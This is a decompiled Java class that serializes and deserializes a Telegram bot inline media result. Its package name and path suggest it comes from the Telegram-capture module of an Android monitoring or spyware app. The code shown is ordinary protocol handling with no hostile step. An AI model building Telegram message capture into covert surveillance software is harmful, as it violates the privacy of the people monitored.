package com.vvt.capture.telegram.internal;

public class TLRPC$TL_botInlineMediaResultDocument
  extends TLRPC.BotInlineResult
{
  public static int constructor = -124267714;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    Object localObject = paramAbstractSerializedData.readString(paramBoolean);
    this.id = ((String)localObject);
    localObject = paramAbstractSerializedData.readString(paramBoolean);
    this.type = ((String)localObject);
    int i = paramAbstractSerializedData.readInt32(paramBoolean);
    localObject = TLRPC.Document.TLdeserialize(paramAbstractSerializedData, i, paramBoolean);
    this.document = ((TLRPC.Document)localObject);
    i = paramAbstractSerializedData.readInt32(paramBoolean);
    localObject = TLRPC.BotInlineMessage.TLdeserialize(paramAbstractSerializedData, i, paramBoolean);
    this.send_message = ((TLRPC.BotInlineMessage)localObject);
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    String str = this.id;
    paramAbstractSerializedData.writeString(str);
    str = this.type;
    paramAbstractSerializedData.writeString(str);
    this.document.serializeToStream(paramAbstractSerializedData);
    this.send_message.serializeToStream(paramAbstractSerializedData);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_botInlineMediaResultDocument.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */